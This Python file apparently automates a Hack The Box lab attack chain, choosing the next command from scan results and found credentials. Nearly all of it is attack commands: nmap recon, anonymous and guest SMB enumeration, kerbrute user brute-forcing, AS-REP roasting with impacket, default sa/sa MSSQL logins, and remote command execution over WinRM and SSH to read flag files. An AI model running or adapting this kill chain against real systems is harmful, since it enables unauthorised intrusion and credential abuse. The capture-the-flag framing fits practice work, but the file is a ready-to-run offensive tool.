"""Deterministic HTB lab playbook. No LLM required for the core kill chain."""
from __future__ import annotations

from pathlib import Path


class LabPlaybook:
    def __init__(self, ip: str, workdir: Path):
        self.ip = ip
        self.work = workdir
        self.scans = workdir / "scans"
        self.loot = workdir / "loot"
        self.scans.mkdir(parents=True, exist_ok=True)
        self.loot.mkdir(parents=True, exist_ok=True)

    def _done(self, history: list, needle: str) -> bool:
        return any(needle in (h.get("command") or "") for h in history)

    def _scan_text(self) -> str:
        p = self.scans / "version_scan.txt"
        if p.exists():
            return p.read_text(errors="ignore")
        p2 = self.scans / "quick_scan.txt"
        return p2.read_text(errors="ignore") if p2.exists() else ""

    def next_action(self, state: dict) -> tuple[str, str]:
        history = state.get("history", [])
        creds = state.get("credentials") or []
        scan = self._scan_text()
        ip = self.ip

        if not self._done(history, "nmap") or not (self.scans / "quick_scan.txt").exists():
            out = self.scans / "quick_scan.txt"
            return (
                f"nmap -Pn -T4 --top-ports 200 -sV --open -oN {out} {ip}",
                "recon",
            )

        if not (self.scans / "version_scan.txt").exists():
            out = self.scans / "version_scan.txt"
            return (
                f"nmap -Pn -sC -sV -p- --min-rate 800 -oN {out} {ip}",
                "recon",
            )

        ad = any(x in scan for x in ("88/tcp", "389/tcp", "445/tcp", "kerberos", "microsoft-ds"))
        web = any(x in scan for x in ("80/tcp", "443/tcp", "http"))
        mssql = "1433/tcp" in scan
        winrm = "5985/tcp" in scan
        ssh = "22/tcp" in scan

        if ad and not self._done(history, "nxc smb"):
            return (f"nxc smb {ip} -u '' -p '' --shares", "enum")

        if ad and not self._done(history, "nxc smb") or (
            ad and not self._done(history, "guest")
        ):
            if not self._done(history, "-u guest"):
                return (f"nxc smb {ip} -u guest -p '' --shares", "enum")

        if ad and Path("/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt").exists():
            if not self._done(history, "kerbrute"):
                wl = "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
                # keep runtime sane on labs
                return (
                    f"kerbrute userenum -d detected.htb --dc {ip} {wl} --threads 20 || true",
                    "enum",
                )

        if ad and not self._done(history, "GetNPUsers"):
            return (
                f"impacket-GetNPUsers detected.htb/ -no-pass -dc-ip {ip} -usersfile {self.loot}/users.txt || "
                f"impacket-GetNPUsers ''/ -no-pass -dc-ip {ip} || true",
                "exploit",
            )

        if mssql and not self._done(history, "nxc mssql"):
            return (f"nxc mssql {ip} -u sa -p sa --local-auth || true", "enum")

        if web and not self._done(history, "curl -sI"):
            return (
                f"curl -sI --max-time 10 http://{ip} || curl -sI --max-time 10 https://{ip} -k || true",
                "enum",
            )

        if web and not self._done(history, "gobuster"):
            wl = "/usr/share/wordlists/dirb/common.txt"
            if not Path(wl).exists():
                wl = "/usr/share/seclists/Discovery/Web-Content/common.txt"
            return (
                f"gobuster dir -u http://{ip} -w {wl} -t 30 -q --timeout 8s || true",
                "enum",
            )

        if creds:
            u = creds[0].get("username", "")
            p = creds[0].get("password", "")
            if u and p and not self._done(history, f"-u {u} -p"):
                if winrm:
                    return (
                        f"nxc winrm {ip} -u '{u}' -p '{p}' -x \"cmd /c type C:\\Users\\*\\Desktop\\user.txt\"",
                        "loot",
                    )
                if ad:
                    return (f"nxc smb {ip} -u '{u}' -p '{p}' --shares", "exploit")
                if ssh:
                    return (
                        f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no {u}@{ip} 'cat ~/user.txt /home/*/user.txt 2>/dev/null'",
                        "loot",
                    )

        if winrm and creds and not self._done(history, "root.txt"):
            u = creds[0].get("username", "")
            p = creds[0].get("password", "")
            return (
                f"nxc winrm {ip} -u '{u}' -p '{p}' -x \"cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt\"",
                "loot",
            )

        return ("echo '[*] Playbook exhausted: add creds via --user/--password or agent_state.json'", "idle")
